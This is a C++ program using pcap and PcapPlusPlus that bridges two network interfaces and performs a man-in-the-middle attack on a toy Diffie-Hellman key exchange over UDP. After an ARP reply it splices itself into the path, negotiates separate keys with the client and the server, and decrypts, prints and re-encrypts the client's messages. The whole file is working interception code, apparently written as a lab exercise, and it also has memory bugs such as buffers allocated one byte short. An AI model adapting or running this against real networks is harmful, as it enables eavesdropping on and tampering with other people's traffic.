
#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <string.h>

#include "pcap.h"
#include "time.h"
#include "PcapLiveDeviceList.h"
#include "EthLayer.h"
#include "ArpLayer.h"
#include "IPv4Layer.h"
#include "IcmpLayer.h"
#include "UdpLayer.h"
#include "PayloadLayer.h"

class Encoder {
public:

  Encoder() {

    private_key = rand() % 100 + 1;
    G = rand() % 100 + 1;
    P = rand() % 100 + 1;

    mutual_key_server = 1;
    mutual_key_client = 1;
    G_server = 1;
    P_server = 1;

  }

  char* decode_from_server(char* buffer) {
    char* result = new char[strlen(buffer)];
    for (int i = 0; i < strlen(buffer); i++) {
      result[i] = char(buffer[i] - mutual_key_server);
    }
    result[strlen(buffer)] = '\0';
    return result;
  }

  char* decode_from_client(char* buffer) {
    char* result = new char[strlen(buffer)];
    for (int i = 0; i < strlen(buffer); i++) {
      result[i] = char(buffer[i] - mutual_key_client);
    }
    result[strlen(buffer)] = '\0';
    return result;
  }

  char* encode_for_server(char* buffer) {
    char* result = new char[strlen(buffer)];
    for (int i = 0; i < strlen(buffer); i++) {
      result[i] = char(buffer[i] + mutual_key_server);
    }
    result[strlen(buffer)] = '\0';
    return result;
  }

  char* encode_for_client(char* buffer) {
    char* result = new char[strlen(buffer)];
    for (int i = 0; i < strlen(buffer); i++) {
      result[i] = char(buffer[i] + mutual_key_client);
    }
    result[strlen(buffer)] = '\0';
    return result;
  }

  int generate_secret_key_for_server() {
    return power(G_server, private_key, P_server);
  }

  int generate_secret_key_for_client() {
    return power(G, private_key, P);
  }

  void generate_mutual_key_server(int secret_key) {
    mutual_key_server = power(secret_key, private_key, P_server);
  }

  void generate_mutual_key_client(int secret_key) {
    mutual_key_client = power(secret_key, private_key, P);
  }

  int get_G() { return G; }
  int get_P() { return P; }
  int set_G_server(int G_server) { return this->G_server = G_server; }
  int set_P_server(int P_server) { return this->P_server = P_server; }

private:

  int G_server;
  int P_server;
  int G;
  int P;
  int private_key;
  int mutual_key_server;
  int mutual_key_client;

  int power(int a, int b, int c) {
    int pow = 1;
    for (int i = 0; i < b; i++) {
      pow = (a * pow) % c;
    }
    return pow;
  }

};

class Machine {
public:

  Machine() {left = NULL; right = NULL; }

  void set_left(Machine* left) { this->left = left; }
  void set_right(Machine* right) { this->right = right; }
  void add_left(Machine* machine) {
    left->set_right(machine);
    machine->set_right(this);
    machine->set_left(left);
    left = machine;
  }

  virtual void recieve_from_left(const u_char* packet, int size) = 0;
  virtual void recieve_from_right(const u_char* packet, int size) = 0;

protected:

  Machine* left;
  Machine* right;

};

class Wire : public Machine {
public:

  Wire() : Machine::Machine() {}

  void recieve_from_left(const u_char* packet, int size) override { 
    right->recieve_from_left(packet, size);
  }

  void recieve_from_right(const u_char* packet, int size) override { 
    left->recieve_from_right(packet, size);
  }

};

class EndPoint : public Machine {
public:

  EndPoint(pcap_t* handle) : handle(handle), Machine::Machine() {}

  void recieve_from_left(const u_char* packet, int size) override { 
    if (right == NULL) {
      if (pcap_sendpacket(handle, packet, size) != 0) {
        std::cout << pcap_geterr(handle) << std::endl;
      }
    }
    else {
      right->recieve_from_left(packet, size);
    }
  }

  void recieve_from_right(const u_char* packet, int size) override { 
    if (left == NULL) {
      if (pcap_sendpacket(handle, packet, size) != 0) {
        std::cout << pcap_geterr(handle) << std::endl;
      }
    }
    else {
      left->recieve_from_right(packet, size);
    }
  }

private:

  pcap_t* handle;

};

EndPoint* left_end_point, *right_end_point;
Wire* wire;

class ManInTheMiddle : public Machine {
public:

  ManInTheMiddle(pcpp::IPv4Address client_ip, pcpp::IPv4Address server_ip, int client_port, int server_port) :
    client_port(client_port), server_port(server_port), client_ip(client_ip), server_ip(server_ip) {}

  void recieve_from_left(const u_char* packet, int size) override { 
    response(packet, size, "left");
  }

  void recieve_from_right(const u_char* packet, int size) override { 
    response(packet, size, "right");
  }

private:

  void response(const u_char* packet, int size, const std::string& dir) {

    timespec ts;
    timespec_get(&ts, TIME_UTC);
    pcpp::RawPacket raw((const uint8_t*)packet, size, ts, false);
    pcpp::Packet parsed(&raw);

    pcpp::EthLayer* eth = parsed.getLayerOfType<pcpp::EthLayer>(); 
    pcpp::IPv4Layer* ipv4 = parsed.getLayerOfType<pcpp::IPv4Layer>();
    pcpp::UdpLayer* udp = parsed.getLayerOfType<pcpp::UdpLayer>();
    pcpp::PayloadLayer* payload = parsed.getLayerOfType<pcpp::PayloadLayer>();

    if (ipv4 == NULL || udp == NULL) {
      if (dir == "left") {
        right->recieve_from_left(packet, size);
      }
      else {
        left->recieve_from_right(packet, size);
      }
      return;
    }

    pcpp::EthLayer eth_response(eth->getSourceMac(), eth->getDestMac(), 0x0800);
    pcpp::IPv4Layer ipv4_response(ipv4->getSrcIPv4Address(), ipv4->getDstIPv4Address());
    pcpp::UdpLayer udp_response(udp->getSrcPort(), udp->getDstPort());
    ipv4_response.getIPv4Header()->timeToLive = ipv4->getIPv4Header()->timeToLive;

    //std::cout << ipv4->getSrcIPAddress()  << " " << ipv4->getDstIPAddress() << std::endl;
    if (ipv4->getSrcIPAddress() == server_ip && ipv4->getDstIPAddress() == client_ip /*&&
      udp->getSrcPort() == server_port && udp->getDstPort() == client_port*/) { 

      static bool initialised = false;

      if (!initialised) {

        initialised = true;
        std::stringstream stream_input, stream_output;

        stream_input << payload->getPayload();
        int G_server, P_server, secret_key_server;
        stream_input >> G_server >> P_server >> secret_key_server;
        encoder.set_G_server(G_server);
        encoder.set_P_server(P_server);
        encoder.generate_mutual_key_server(secret_key_server);

        stream_output << encoder.get_G() << " " << encoder.get_P() << " " <<
          encoder.generate_secret_key_for_client() << std::endl;
        const char* output = stream_output.str().c_str();
        const uint8_t* casted_output = (const uint8_t*)output;
        pcpp::PayloadLayer payload_response(casted_output, strlen(output), false);

        pcpp::Packet parsed_response;
        parsed_response.addLayer(&eth_response, false);
        parsed_response.addLayer(&ipv4_response, false);
        parsed_response.addLayer(&udp_response, false);
        parsed_response.addLayer(&payload_response, false);
        parsed_response.computeCalculateFields();
        pcpp::RawPacket* raw_response = parsed_response.getRawPacket();
        const uint8_t* data = raw_response->getRawData();
        const u_char* response = (const u_char*) data;

        if (dir == "left") {
          right->recieve_from_left(response, raw_response->getRawDataLen());
        }
        else {
          left->recieve_from_right(response, raw_response->getRawDataLen());
        }

        return;
        
      }

      uint8_t* input = payload->getPayload();
      char* casted_input = (char*)input;
      char* decoded = encoder.decode_from_server(casted_input);
      char* encoded = encoder.encode_for_client(decoded);

      const uint8_t* casted_output = (const uint8_t*)encoded;
      pcpp::PayloadLayer payload_response(casted_output, strlen(encoded), false);

      pcpp::Packet parsed_response;
      parsed_response.addLayer(&eth_response, false);
      parsed_response.addLayer(&ipv4_response, false);
      parsed_response.addLayer(&udp_response, false);
      parsed_response.addLayer(&payload_response, false);
      parsed_response.computeCalculateFields();
      pcpp::RawPacket* raw_response = parsed_response.getRawPacket();
      const uint8_t* data = raw_response->getRawData();
      const u_char* response = (const u_char*) data;
      if (dir == "left") {
        right->recieve_from_left(response, raw_response->getRawDataLen());
      }
      else {
        left->recieve_from_right(response, raw_response->getRawDataLen());
      }

    }
    else if (ipv4->getSrcIPAddress() == client_ip && ipv4->getDstIPAddress() == server_ip /*&&
      udp->getSrcPort() == client_port && udp->getDstPort() == server_port*/) { 
      
      static bool step_one = false;
      static bool step_two = false;

      if (!step_one) {
        step_one = true;
        if (dir == "left") {
          right->recieve_from_left(packet, size);
        }
        else {
          left->recieve_from_right(packet, size);
        }
        return;
      }
      else if (!step_two) {

        step_two = true;
        std::stringstream stream_input, stream_output;
        
        stream_input << payload->getPayload();
        int secret_key_client;
        stream_input >> secret_key_client;
        encoder.generate_mutual_key_client(secret_key_client);

        stream_output << encoder.generate_secret_key_for_server() << std::endl;
        const char* output = stream_output.str().c_str();
        const uint8_t* casted_output = (const uint8_t*)output;
        pcpp::PayloadLayer payload_response(casted_output, strlen(output), false);

        pcpp::Packet parsed_response;
        parsed_response.addLayer(&eth_response, false);
        parsed_response.addLayer(&ipv4_response, false);
        parsed_response.addLayer(&udp_response, false);
        parsed_response.addLayer(&payload_response, false);
        parsed_response.computeCalculateFields();
        pcpp::RawPacket* raw_response = parsed_response.getRawPacket();
        const uint8_t* data = raw_response->getRawData();
        const u_char* response = (const u_char*) data;

        if (dir == "left") {
          right->recieve_from_left(response, raw_response->getRawDataLen());
        }
        else {
          left->recieve_from_right(response, raw_response->getRawDataLen());
        }

        return;

      }

      std::cout << "Message From Client:" << std::endl;
      std::cout << "From " << client_ip << ":" << client_port << std::endl;
      std::cout << "To " << server_ip << ":" << server_port << std::endl;

      uint8_t* input = payload->getPayload();
      char* casted_input = (char*)input;

      char* decoded = encoder.decode_from_client(casted_input);
      std::cout << decoded << std::endl << std::endl;
      char* encoded = encoder.encode_for_server(decoded);

      const uint8_t* casted_output = (const uint8_t*)encoded;
      pcpp::PayloadLayer payload_response(casted_output, strlen(encoded), false);

      pcpp::Packet parsed_response;
      parsed_response.addLayer(&eth_response, false);
      parsed_response.addLayer(&ipv4_response, false);
      parsed_response.addLayer(&udp_response, false);
      parsed_response.addLayer(&payload_response, false);
      parsed_response.computeCalculateFields();
      pcpp::RawPacket* raw_response = parsed_response.getRawPacket();
      const uint8_t* data = raw_response->getRawData();
      const u_char* response = (const u_char*) data;
      if (dir == "left") {
        right->recieve_from_left(response, raw_response->getRawDataLen());
      }
      else {
        left->recieve_from_right(response, raw_response->getRawDataLen());
      }
      
    }
    else {
      if (dir == "left") {
        right->recieve_from_left(packet, size);
      }
      else {
        left->recieve_from_right(packet, size);
      }
    }

  }

  int client_port;
  int server_port;
  pcpp::IPv4Address client_ip;
  pcpp::IPv4Address server_ip;
  Encoder encoder;

};

class ArpResponder : public Machine {
public:

  ArpResponder() : Machine::Machine() {}

  void recieve_from_left(const u_char* packet, int size) override { 
    check_arp(packet, size);
    right->recieve_from_left(packet, size);
  }

  void recieve_from_right(const u_char* packet, int size) override { 
    check_arp(packet, size);
    left->recieve_from_right(packet, size);
  }

private:

  void check_arp(const u_char* packet, int size) {

    timespec ts;
    timespec_get(&ts, TIME_UTC);
    pcpp::RawPacket raw((const uint8_t*)packet, size, ts, false);
    pcpp::Packet parsed(&raw);

    pcpp::EthLayer* eth = parsed.getLayerOfType<pcpp::EthLayer>(); 
    pcpp::ArpLayer* arp = parsed.getLayerOfType<pcpp::ArpLayer>(); 
    if (eth == NULL || arp == NULL) { return; }

    if (eth->getEthHeader()->etherType == 1544 && arp->getArpHeader()->opcode == 256) {
      //std::cout << arp->getSenderIpAddr() << " " << arp->getTargetIpAddr() << std::endl;
      ManInTheMiddle* middle = new ManInTheMiddle(arp->getSenderIpAddr(), arp->getTargetIpAddr(), 8080, 8080);
      wire->add_left(middle);
    }

  }

};

int main(int argc, char* argv[]) {

  pcap_t* left = pcap_open_live(
    argv[1], BUFSIZ, 1, -1, NULL
  );

  pcap_t* right = pcap_open_live(
    argv[2], BUFSIZ, 1, -1, NULL
  );

  ArpResponder arp;
  left_end_point = new EndPoint(left);
  right_end_point = new EndPoint(right);
  wire = new Wire();

  left_end_point->set_right(&arp);
  arp.set_right(wire);
  wire->set_right(right_end_point);

  right_end_point->set_left(wire);
  wire->set_left(&arp);
  arp.set_left(left_end_point);

  while (true) {
    const u_char* packet;
    struct pcap_pkthdr* packet_header;
    if (pcap_next_ex(left, &packet_header, &packet) == 1) {
      left_end_point->recieve_from_left(packet, packet_header->len);
    }
    if (pcap_next_ex(right, &packet_header, &packet) == 1) {
      right_end_point->recieve_from_right(packet, packet_header->len);
    }
  }

  return 0;

}
